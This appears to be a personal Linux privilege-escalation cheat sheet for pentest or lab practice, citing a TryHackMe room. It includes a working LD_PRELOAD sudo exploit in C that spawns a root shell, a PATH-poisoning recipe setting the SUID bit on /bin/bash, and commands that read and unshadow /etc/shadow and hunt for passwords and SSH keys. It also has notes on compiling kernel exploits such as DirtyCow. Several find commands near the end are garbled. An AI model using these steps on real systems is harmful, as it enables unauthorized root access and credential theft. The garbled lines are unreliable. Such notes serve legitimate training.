
##  sudo -l [if you have the password]

##  sudo LD_PRELOAD vuln

------------------------ LD_PRELOAD vulnerability sudo  -----------------------------------------------------------

--The LD_PRELOAD runs the file with env.so file configured and the command will be executed on behalf of the "env.so file"
--- Sometimes the LD_PRELOAD is misconfigured and can be used to escalate_privilages

>> vim /etc/sudoers

      # Adding HOME to env_keep may enable a user to run unrestricted
      # commands via sudo.
      #
      Defaults   env_keep += LD_PRELOAD

      Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin

      ## Next comes the main part: which users can run what software on 
      ## which machines (the sudoers file can be shared between multiple
      ## systems).
      ## Syntax:
      ##
      ##   user  MACHINE=COMMANDS
      ##
      ## The COMMANDS section may have other options added to it.
      ##
      ## Allow root to run any commands anywhere 
      root  ALL=(ALL)   ALL
      yogi  ALL=(ALL)  /usr/bin/whoami

>> vim /tmp/env.c

``` c
      #include <stdio.h>
      #include <sys/types.h>
      #include <stdlib.h>
      void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
      }
```

--- compliing the file into so file

>> gcc -fPIC -shared -o /tmp/env.so /tmp/env.c -nostartfiles


>> sudo LD_PRELOAD=/tmp/env.so whoami

--- now executing the file will give us the root shell

>  It is necessary to check all the PATH of sudo to check if any writeable PATH is present

>   https://tryhackme.com/room/linuxprivesc
==================================================================================================================

##  System Enumeration

-     hostname
-     uname -a
-     cat /proc/version
-     cat /etc/issue
-     lscpu `[x64 bit]`
-     cat /etc/os-release
-     cat /etc/*-release

##	Running Process / services `[-tasklist]`
-     ps aux
-     ps -aux

##  Run command as differrent user

>   sudo -u <username> <whoami> 

##	User Enumeration

-     whoami
-     id
-     sudo -l
-     cat /etc/passwd | grep sh
-     cat /etc/shadow

>	Groups Enumeration [If unusual group is available for you, must check]	
-     groups
-     cat /etc/group

>     history cmd

##	Network Information

-     ifconfig
-     ip a
-     ifconfig -a
-     ip route
-     arp -a
-     ip neigh
-     netstat -tunlp
-     ss -tunlp
-     lsof -i -P -n | grep LISTEN
-     cat /etc/services
-	ifconfig / ip a

##  Insecure File Permission
-   find all the writable files `[find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u]`
-   ls -lha /etc/passwd
-   ls -lha /etc/shadow
-   ls -lha /etc/crontab
-     unshadow passwd shadow > unshadow

##	Directory Enumeration

>   /home, /opt, /var, /srv, /etc, /mnt [check-for-any-unusual-location/different-user-directory]
>   /var/www/html, /var/mail, /var/backups, /var/opt

##  SUID / SGID
-   find / -type f -perm -04000 -ls 2>/dev/null
-   find / -perm -u=s -type f 2>/dev/null
-   find / -perm -g=s -type f 2>/dev/null

##  File Enumeration

-   /etc/passwd, /etc/shadow, /etc/group, /etc/groups, id_rsa, 
-   .bashrc, .bash_history, .profile, .viminfo, .zsh_history,.zshrc
-   .bak, .secret, 
-   cat /etc/crontab, cron.d/, cron.daily/, cron.hourly/, cron.monthly/, cron.weekly


##  PATH POISONING

-   check running crons
-   find the binary name / file name  [service.sh]
-   touch /tmp/service.sh
-   echo "chmod u+s /bin/bash" > service.py 
-   export PATH=/tmp:$PATH
-   wait for the service to run again



##	Apache Startup PE

##  Cron Jobs - File Permissions 

-     crontab -l
-     /etc/crontab
-     /var/log/cron.log
-     cat /etc/crontab, cron.d/, cron.daily/, cron.hourly/, cron.monthly/, cron.weekly

##	Password Mining [password/pass/pwd/pass=/pass='/pass="] [id_rsa/authorized_keys]

-     grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
-     grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
-     find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

-     locate password | more
-     locate ovpn

-     find / -name authorized_keys 2> /dev/null
-     find / -name id_rsa 2> /dev/null

-   cat ~/.*history | less
```
-------------------------------------------------------------------------------------------------------------------------------------------------------

######################################################### Password-mining-privilage-escalation ########################

-------------------------------------------------------------------------------------------------------------------------------------------------------




>>  grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null



>> find / -type f -exec grep -i -I "PASSWORD" {} 2>/dev/null \;



>> find / -type f -name "password" 2>/dev/null



>> locate passwd



>> find / -type f -name ".htaccess" 2>/dev/null



>> find / -type f -name "htpasswd" 2>/dev/null



>> find / -type f -name "wp-config.php" 2>/dev/null



>> find / -type f -name "config.inc.php" 2>/dev/null



>> find / -type f -name "db.config.php" 2>/dev/null



>> find / -type f -name httpd.conf 2>/dev/null



>> find /-type f-name access log 2>/dev/null



>> find /-type f -name .log 2>ldev/nul



>> find /-type f -name error log 2>/dev/null



>> find /-type f -name config.inc.php 2>Idev/null



>> find /-type f -name .htpasswd 2>/dev/null



>> find /-type f -name .bash history 2>ldev/null



>> find /-type f -name .mysql history 2>ldev/null



>> find /-type f -name service.pwd 2>/dev/null



>> find /-type f -name "config 2>-/dev/nul




## Mail

>> cat /var/mail/root

>> cat /var/mail/armour

>> cat /var/spool/mail/armour
```

##  Service Exploit
>   mysql exploit
>   check

>   Grep commands for finding password



##  Kernal Exploit

>   cross compiling [https://forums.offensive-security.com/showthread.php?48259-Fix-for-incompatibility-with-older-versions-of-gcc-Kali-2022-3]
>   cross compile in kali with 32bit static commands

```
[FIND-GCC]

>   gcc
/bin/sh: 1: gcc: not found

>   find / -name gcc -type f 2>/dev/null

/usr/share/bash-completion/completions/gcc



[+] gcc: error trying to exec ‘cc1‘: execvp: No such file or directory

https://programmerah.com/gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory-27405/

```
find /usr/ -name "*cc1*"
# out:  /usr/share/terminfo/x/xterm+pcc1
# out:  /usr/libexec/gcc/x86_64-redhat-linux/4.8.2/cc1
# out: /usr/libexec/gcc/x86_64-redhat-linux/4.8.2/cc1plus
export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/
```
============================================================================

[+] gcc 44298.c -static -static-libgcc -static-libstdc++ -o 44298


[+] 32 BIT gcc compiling

>   sudo apt-get install libc6-dev-i386

-   Then, after the installation completes, just use the -m32 flag when compiling. For example:

>   gcc 40616.c -m32 -o cowroot -pthread

>   gcc dc32.c -static -static-libgcc -static-libstdc++ -m32 -o dirty32try



##  Resources

https://practicalpentestlabs.com/forum/?post=7
https://github.com/exrienz/DirtyCow [DirtyCow 32 & 64 bit binaries]
```


##	Tools
>   linpeas
>   pspy
>   chisel
>   linux-prev-check [pentest-monkey]
>   LinEnum.sh